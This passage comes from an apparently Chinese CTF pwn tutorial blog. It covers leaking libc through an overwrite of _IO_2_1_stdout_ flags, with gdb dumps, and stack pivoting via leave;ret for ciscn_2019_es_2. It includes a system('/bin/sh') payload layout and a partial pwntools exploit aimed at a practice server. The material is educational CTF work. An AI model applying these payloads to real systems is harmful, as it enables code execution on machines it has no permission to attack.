<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x7ffff7dd26a3</span><br><span class="line">0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt;:   0xdd3780000000000a      0xffffff00007ffff7</span><br><span class="line">0x7ffff7dd26b3 &lt;_IO_2_1_stdout_+147&gt;:   0x000000ffffffffff      0xdd17a00000000000</span><br><span class="line">0x7ffff7dd26c3 &lt;_IO_2_1_stdout_+163&gt;:   0x00000000007ffff7      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d3 &lt;_IO_2_1_stdout_+179&gt;:   0x0000000000000000      0xffffff0000000000</span><br><span class="line">0x7ffff7dd26e3 &lt;_IO_2_1_stdout_+195&gt;:   0x00000000000000ff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f3 &lt;_IO_2_1_stdout_+211&gt;:   0xdd06e00000000000      0xdd254000007ffff7</span><br><span class="line">0x7ffff7dd2703 &lt;stderr+3&gt;:      0xdd262000007ffff7      0xdd18e000007ffff7</span><br><span class="line">0x7ffff7dd2713 &lt;stdin+3&gt;:       0xa2db8000007ffff7      0x00000000007ffff7</span><br><span class="line">0x7ffff7dd2723 &lt;map+3&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2733 &lt;__printf_arginfo_table+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2743 &lt;buf+3&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2753 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2763 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2773 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2783 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2793 &lt;ttyname_buf+3&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>若我们通过低字节覆盖，将它低字节覆盖为<code>\x00</code>，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x7ffff7dd2600</span><br><span class="line">0x7ffff7dd2600 &lt;_IO_2_1_stderr_+192&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2610 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0#这里包含了libc中的值</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001      0xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000      0x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007ffff7dd17a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>它就会根据<code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>来输出从&lt;_IO_2_1_stderr_+192&gt;到 &lt;_IO_2_1_stdout_+131&gt;中间的内容</p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>所以我们要泄露地址，首先要将 <code>io_file</code> 的 <code>_IO_CURRENTLY_PUTTING</code> 置 1，<code>_IO_IS_APPENDING</code> 0x1000 置 1，以及 <code>_IO_NO_WRITES</code> 0x8 不要为 1，就可以进行地址泄露了，一般可以覆盖为 <code>0xfbad1800</code>，就可以泄露 <code>write_base</code> 和 <code>write_ptr</code> 之间的值，随便运行个程序，我们可以看到这里，可以看到 <code>write_base</code> 和 <code>write_ptr</code> 都是 <code>libc</code>。</p>
<p><strong>deepseek解释0xfbad1800:</strong></p>
<p>在 <code>_flags</code> 字段 <code>0xfbad1800</code> 中，<code>0x1000</code> 和 <code>0x8</code> 对应的二进制位如下：</p>
<ol>
<li><strong>标志位解析</strong>：</li>
</ol>
<ul>
<li><p><strong><code>_IO_IS_APPENDING</code>（0x1000）</strong>：</p>
<ul>
<li><strong>位位置</strong>：第 <strong>12 位</strong>（从 0 开始计数）。</li>
<li><strong>在 <code>0xfbad1800</code> 中的状态</strong>：<br><code>0xfbad1800 &amp; 0x1000 = 0x1000</code>，说明该位被设置为 <strong>1</strong>。</li>
<li><strong>作用</strong>：表示文件流处于追加模式（<code>append</code>），允许写入时自动定位到文件末尾。</li>
</ul>
</li>
<li><p><strong><code>_IO_NO_WRITES</code>（0x8）</strong>：</p>
<ul>
<li><strong>位位置</strong>：第 <strong>3 位</strong>。</li>
<li><strong>在 <code>0xfbad1800</code> 中的状态</strong>：<br><code>0xfbad1800 &amp; 0x8 = 0</code>，说明该位被设置为 <strong>0</strong>。</li>
<li><strong>作用</strong>：允许写入操作（若为 1 则禁止写入）。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong><code>0xfbad1800</code> 的二进制分解</strong>：</li>
</ol>
<p>将 <code>0xfbad1800</code> 转换为 32 位二进制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1111 1011 1010 1101 0001 1000 0000 0000</span><br><span class="line">                       ^            ^</span><br><span class="line">                       |           |</span><br><span class="line">                       |           +-- 第 3 位 (0x8)：0</span><br><span class="line">                       +-- 第 12 位 (0x1000)：1</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>其他关键标志</strong>：</li>
</ol>
<ul>
<li><p><strong><code>_IO_CURRENTLY_PUTTING</code>（0x800）</strong>：</p>
<ul>
<li><strong>位位置</strong>：第 <strong>11 位</strong>。</li>
<li><strong>在 <code>0xfbad1800</code> 中的状态</strong>：<br><code>0xfbad1800 &amp; 0x800 = 0x800</code>，说明该位被设置为 <strong>1</strong>。</li>
<li><strong>作用</strong>：表示当前正在进行输出操作（<code>put</code>）。</li>
</ul>
</li>
<li><p><strong><code>_IO_MAGIC</code>（0xfbad0000）</strong>：</p>
<ul>
<li><strong>高 16 位</strong>：<code>0xfbad</code>，标识这是一个合法的 <code>FILE</code> 结构。</li>
</ul>
</li>
</ul>
<ol start="4">
<li><strong>总结</strong>：</li>
</ol>
<ul>
<li><strong><code>0xfbad1800</code> 的位设置</strong>：<ul>
<li><strong>第 12 位（0x1000）</strong>：1（允许追加模式）。</li>
<li><strong>第 3 位（0x8）</strong>：0（允许写入操作）。</li>
<li><strong>第 11 位（0x800）</strong>：1（正在写入）。</li>
</ul>
</li>
</ul>
<p>通过覆盖 <code>_flags</code> 为 <code>0xfbad1800</code>，可以满足以下条件：</p>
<ol>
<li>启用 <code>_IO_IS_APPENDING</code> 和 <code>_IO_CURRENTLY_PUTTING</code>。</li>
<li>禁用 <code>_IO_NO_WRITES</code>，从而允许地址泄露。</li>
</ol>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>随便找一个输出菜单有puts的堆题，直接gdb运行起来</p>
<p>第一步，通过<code>x/32gx &amp;_IO_2_1_stdout_</code>来查看 stdout 的位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001      0xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000      0x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007ffff7dd17a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0</span><br><span class="line">0x7ffff7dd2700 &lt;stderr&gt;:        0x00007ffff7dd2540      0x00007ffff7dd2620</span><br><span class="line">0x7ffff7dd2710 &lt;stdin&gt;: 0x00007ffff7dd18e0      0x00007ffff7a2db80</span><br></pre></td></tr></table></figure>

<p>第二步，通过<code>p *(struct _IO_FILE_plus*)0x7ffff7dd2620</code>查看它的结构体信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*)0x7ffff7dd2620</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = 1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第三步，设置flag值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> *0x7ffff7dd2620 = 0xfbad1800</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad1800      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br></pre></td></tr></table></figure>

<p>第四步，设置_IO_write_base低位为\x00</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> *0x7ffff7dd2640 = 0x7ffff7dd2600</span><br><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad1800      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd2600      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br></pre></td></tr></table></figure>

<p>再看结构体：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*)0x7ffff7dd2620</span><br><span class="line"><span class="variable">$4</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72542208,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x7ffff7dd2600 &lt;_IO_2_1_stderr_+192&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>,</span><br></pre></td></tr></table></figure>

<p>最终，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">1</span><br><span class="line">����&amp;��&amp;��&amp;�&amp;��&amp;��&amp;��&amp;��&amp;����������size:  </span><br></pre></td></tr></table></figure>

<p>可以看到在size: 前面多了一些东西，若我们在gdb的debug模式下就可以看到输出的是什么了。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>可以参考largebin_attack中的starctf_2019_heap_master</p>
<p>在exp中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">1</span>))<span class="comment">#这个接收 b&#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">24</span>))<span class="comment">#jie&#x27;sh</span></span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = uu64(data) - libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br></pre></td></tr></table></figure>

<p>实现了接收泄露出的<code>_IO_file_jumps</code>的libc地址，从而计算出libc_base</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>io</tag>
      </tags>
  </entry>
  <entry>
    <title>栈迁移</title>
    <url>/2025/03/21/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[<p>本文讨论的原理，都是针对于32位程序的栈迁移来说的，例题里面有一道是64位的栈迁移</p>
<h3 id="1、什么是栈迁移"><a href="#1、什么是栈迁移" class="headerlink" title="1、什么是栈迁移"></a>1、什么是栈迁移</h3><p> 这里我谈谈自己的理解，简单一句话：<strong>栈迁移就是控制程序的执行流</strong>（这个换的地方既可以是bss段也可以是栈里面），此时新的问题随之产生，为什么要换个地方GetShell，这就是下一段要说的为什么要使用栈迁移。</p>
<h3 id="2、为什么要使用栈迁移-什么时候该使栈迁移（使用栈迁移的条件）"><a href="#2、为什么要使用栈迁移-什么时候该使栈迁移（使用栈迁移的条件）" class="headerlink" title="2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）"></a>2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）</h3><p>言简意赅的来说，就是可溢出的长度不够用，也就是说我们要么是没办法溢出到返回地址只能溢出覆盖ebp，要么是刚好溢出覆盖了返回地址但是受payload长度限制，没办法把参数给写到返回地址后面。总之呢，就是能够溢出的长度不够，没办法GetShell，所以我们才需要换一个地方GetShell。</p>
<p> 使用栈迁移的条件：</p>
<ul>
<li>要能够溢出</li>
<li>有个可写的地方（就是你要GetShell的地方），先考虑bss段，最后再考虑写到栈中</li>
<li>可以控制sp寄存器</li>
</ul>
<h3 id="3、学习栈迁移需要自身掌握什么知识"><a href="#3、学习栈迁移需要自身掌握什么知识" class="headerlink" title="3、学习栈迁移需要自身掌握什么知识"></a>3、学习栈迁移需要自身掌握什么知识</h3><ul>
<li>需要掌握汇编基础</li>
<li>较为熟悉栈结构</li>
<li>熟悉函数调用与结束时栈的变化。</li>
</ul>
<p>如果掌握了这些知识，那么理解下面的内容就不会太费力气了。当然如果你会用gdb进行调试的话，通过自己的动手调试，你将理解的更为透彻。如果你和我当初一样，也是对栈迁移一无所知，那么希望你可以仔细阅读下面的内容，我会帮你彻底理解它。</p>
<h3 id="4、栈迁移的原理"><a href="#4、栈迁移的原理" class="headerlink" title="4、栈迁移的原理"></a>4、栈迁移的原理</h3><h5 id="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系），以下图为例"><a href="#ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系），以下图为例" class="headerlink" title="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系），以下图为例"></a>ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系），以下图为例</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0e:0038│ ebp 0xffffd0c8 —▸ 0xffffd0d8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br></pre></td></tr></table></figure>



<p> ebp是0xffffd0c8，它的内容是0xffffd0d8，而这个内容也是一个地址，这个地址里面装的又是0xf7ffd020。ebp本身大部分时候都是一个地址（程序正常运行情况下），而ebp的内容可以是地址，也可以不是地址（程序正常运行下，ebp的内容也装的是地址，但如果你进行溢出的话，自然可以不装成地址）。我这里想强调的是<em><strong>ebp和ebp的内容这两者一定不能混为一谈</strong></em>，在阅读下面的内容是，一定要注意区分两者。</p>
<h3 id="栈迁移的核心，就在于两次的leave-ret指令上面"><a href="#栈迁移的核心，就在于两次的leave-ret指令上面" class="headerlink" title="栈迁移的核心，就在于两次的leave;ret指令上面"></a><strong>栈迁移的核心，就在于两次的leave;ret指令上面</strong></h3><p> leave指令即为mov esp ebp;pop ebp先将ebp赋给esp，此时esp与ebp位于了一个地址，你可以现在把它们指向的那个地址，即当成栈顶又可以当成是栈底。然后pop ebp，将<strong>栈顶的内容</strong>弹入ebp（此时栈顶的内容也就是ebp的内容，也就是说现在把ebp的内容赋给了ebp）。因为esp要时刻指向栈顶，既然栈顶的内容都弹走了，那么esp自然要往下挪一个内存单元。具体实现请见下图：</p>
<img data-src="../images/image-20241120213824271.png" alt="image-20241120213824271" style="zoom:50%;" />

<p> ret指令为pop eip，这个指令就是把栈顶的内容弹进了eip（就是下一条指令执行的地址）具体实现请见下图：</p>
<p><img data-src="/../images/2706180-20220118102755803-79970067.png" alt="2706180-20220118102755803-79970067"></p>
<p>若这个ret_address为<code>leave;ret</code>且<code>fake_frame</code>为我们精心构造的栈帧，就可以实现将esp寄存器也迁移到我们精心构造的栈帧，从而实现get_shell等操作，具体实现请见下图：</p>
<p><img data-src="/../images/image-20241120220941300.png" alt="image-20241120220941300"></p>
<p>栈迁移的例题有以下几种：</p>
<p>攻防世界上的greeting-150</p>
<p>BUUCTF上的[Black Watch 入群题]</p>
<p>BUUCTF上的ciscn_2019_es_2</p>
<p>BUUCTF上的gyctf_2020_borrowstack</p>
<p> 它们考察了在迁移到栈，迁移到bss段，从main函数结束时迁移，从main函数调用的函数结束时迁移，和64位的栈迁移以及ret2csu。</p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>拖入ida中反编译如下，32位只有NX保护：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">hack</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>大概思路就是，我们要用第一个read来泄露下ebp的地址**（因为是printf来打印字符串，参数是%s，因此是遇见00才停止打印，只要我们第一次read正好输入0x28个字符，那就没有地方在填上00了（read读入之后，会自动补充00），因此就可以把下面的ebp地址给打印出来了）**，然后第二个read用来填充我们构造的system函数以及参数（我们这次是转移到了栈中，也就是第一次read读入s的地方），</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">                   <span class="comment">#bin_sh的指针         #填充够0x28 |  ebp    |    ret              </span></span><br><span class="line">|system@plt|p32(<span class="number">0</span>)|p32(buf+<span class="number">12</span>)|/<span class="built_in">bin</span>/sh\x00|\x00...|p32(buf-<span class="number">4</span>)|p32(leave_ret)</span><br></pre></td></tr></table></figure>

<p>参数分布参考上图</p>
<p>后面的p32(buf-4) + p32(leave) p32(buf-4) 是将ebp覆盖成buf的地址-4 为什么要-4？这是因为我们利用的是两个leave，但是第二个 leave的pop ebp，在出栈的时候会esp+4。就会指向esp+4的位置， p32(leave) ,将返回地址覆盖成leave 到这里，我们成功将栈劫持到了我们的buf处，接下来就会执行栈里的内容 完整exp见解题过程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28649</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span 